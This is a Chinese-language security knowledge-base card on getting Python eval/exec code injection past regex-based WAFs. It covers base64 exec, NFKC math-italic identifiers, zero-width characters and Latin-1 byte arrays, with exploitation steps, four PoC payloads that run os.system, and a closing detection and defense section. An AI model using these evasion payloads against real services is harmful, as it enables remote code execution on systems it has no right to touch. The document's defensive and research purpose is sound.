---
id: web-python-waf-bypass-encoding-unicode-normalization
title: Python 代码执行 WAF 绕过：编码与 Unicode 归一化
type: scenario
domain: web
path: web/python
technique: python-waf-encoding-unicode-bypass
tags:
- python
- waf-bypass
- unicode
- nfkc
- zero-width
- base64
- latin-1
- evasion
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:33:42+08:00'
  notes: 已对照原文与截图 08、12、13、15、16 核对：base64 exec、数学斜体 NFKC、U+200B 零宽、Latin-1 bytes 数字数组四条 payload 均返回 Verification passed；PEP 3131 NFKC 归一化与运行期解码原理正确；未验证点：仅雷池个人版环境验证，跨厂商表显示部分厂商仍拦截 6/10/11/13
url: /docs/web/python/web-python-waf-bypass-encoding-unicode-normalization/
draft: false
kb_aliases:
- base64 exec 绕过 WAF
- NFKC Unicode 斜体绕过
- 零宽字符绕过 WAF
- Latin-1 字节流绕过
- Python 编码层绕过
---

## 一句话结论

利用 Python 解释器运行期的解码与标识符归一化特性（base64 解码、Unicode NFKC 斜体、零宽字符清除、Latin-1 字节流），可以让请求原文不包含敏感关键字，而执行时还原为 `import os; os.system(...)`，从而绕过基于原文正则的 WAF。

## 原理

- WAF 匹配的是传输层文本；Python 在编译/运行期才做转义、编码、标识符归一化。二者处理层级不同，形成盲区。
- base64：`exec(base64.b64decode('...').decode())` 把整段代码藏进 Base64；原文没有 `import`、`os`、`system` 等特征，只有一段无意义字符。
- Unicode NFKC（PEP 3131）：Python 3 解析标识符时按 NFKC 做兼容性归一化，数学斜体字母 `𝒆𝒙𝒆𝒄`、`𝒔𝒚𝒔𝒕𝒆𝒎` 会被归一化为 `exec`、`system`；它们在 UTF-8 字节层面与 ASCII 完全不同，基于 `[a-z]` 的正则无法匹配。
- 零宽字符：在 `os.system` 的字符间插入 `​`（零宽空格），正则看到的是被中断的字符串；Python 字符串在运行期用 `.replace('​','')` 清除后再 `eval`，得到原始代码。
- Latin-1 字节流：0–255 字节与 Latin-1 字符 1:1 映射；用 `bytes([...]).decode('latin-1')` 在运行期拼出函数名与代码，再用 `__builtins__[k]` 索引执行，原文只有数字数组。
- 这些手法可单独使用，也可与关键字拆分/动态属性手法叠加，进一步降低被多规则命中的概率。

## 触发条件

- 目标存在用户可控的 `eval`/`exec` 代码执行入口。
- WAF 未先做 Unicode NFKC 归一化、转义解码、零宽字符清理，也未对 Base64/字节流做递归检测。
- WAF 规则以 ASCII 关键字/正则为主（原文雷池 SafeLine 9.3.3 个人版对 payload 6/10/11/13 均未拦截）。
- 目标 Python 版本支持 f-string、PEP 3131（Python 3 均支持）。

## 利用步骤

1. 确认代码执行入口，先用 `import os; os.system("w")` 观察拦截。
2. 选择编码层：
   - Base64：本地编码 `import os;os.system('w')`，提交 `exec(base64.b64decode(...).decode())`。
   - NFKC：把 `exec`、`system` 等标识符替换为数学斜体 Unicode 字符。
   - 零宽：在敏感字符串中插入 `​`，运行时 replace 掉。
   - Latin-1：把函数名/代码转成字节数组，运行时 decode 后索引 `__builtins__`。
3. 发送并观察响应；原文测试均返回 `200 Verification passed! Code executed successfully.`。
4. 视 WAF 结果与关键字拆分手法组合。

## PoC

```python
# 1) Base64：原文不含 import/os/system
import base64
exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgndycp').decode())
# 解码后：import os;os.system('w')
```

```python
# 2) Unicode NFKC：斜体标识符运行期归一化为 exec/system
𝒆𝒙𝒆𝒄("import os;os.𝒔𝒚𝒔𝒕𝒆𝒎('w')")
```

```python
# 3) 零宽字符：字符串中插入 U+200B，运行期清除后 eval
import builtins, os
c = 'o​s.s​y​s​tem("w")'.replace('​', '')
getattr(builtins, 'ev'+'al')(c)
```

```python
# 4) Latin-1 字节流：函数名与代码均为数字数组
b = __builtins__
k = bytes([101,120,101,99]).decode('latin-1')          # exec
code = bytes([105,109,112,111,114,116,32,111,115,59,
              111,115,46,115,121,115,116,101,109,40,
              39,119,39,41]).decode('latin-1')          # import os;os.system('w')
b[k](code)
```

## 变体与关联

- 变体：Base64 可换成十六进制、URL 编码、gzip/zlib 压缩后再解码，原理相同。
- 变体：NFKC 斜体字符可换成其他数学字母/全角字符，只要 NFKC 归一化后等于目标 ASCII 标识符。
- 变体：零宽字符可换成其他不可见字符（如 `‌`、`‍`、`﻿`），运行时统一清除。
- 关联：与关键字拆分、`getattr` 自省链、f-string 拆分组合使用，可对抗多规则 WAF。
- 关联卡片：[[web-python-waf-bypass-dynamic-attribute-keyword-split]]

## 检测与防御

- 检测：请求体出现 Base64 长串后跟 `b64decode`/`exec`；出现数学字母区（U+1D400–U+1D7FF）等非 ASCII 标识符。
- 检测：请求体含零宽字符（U+200B/U+200C/U+200D/U+FEFF）或大量 `\uXXXX`/`\xXX` 转义。
- 检测：请求体含数字字节数组 + `bytes(...).decode('latin-1')` + `__builtins__` 索引的组合。
- 修复：WAF 先做 Unicode NFKC 归一化、转义解码、零宽字符清理，再做语法/AST 级检测；对 Base64/压缩数据递归解码检查。
- 加固：禁止对不可信输入使用 `eval`/`exec`；使用 AST 白名单或独立沙箱；记录并告警编码层绕过尝试。
- 注意：不同 WAF 厂商对同一 payload 结果不同（原文对比表显示部分厂商会拦截 payload 6/10/11/13），需按目标实际产品验证。
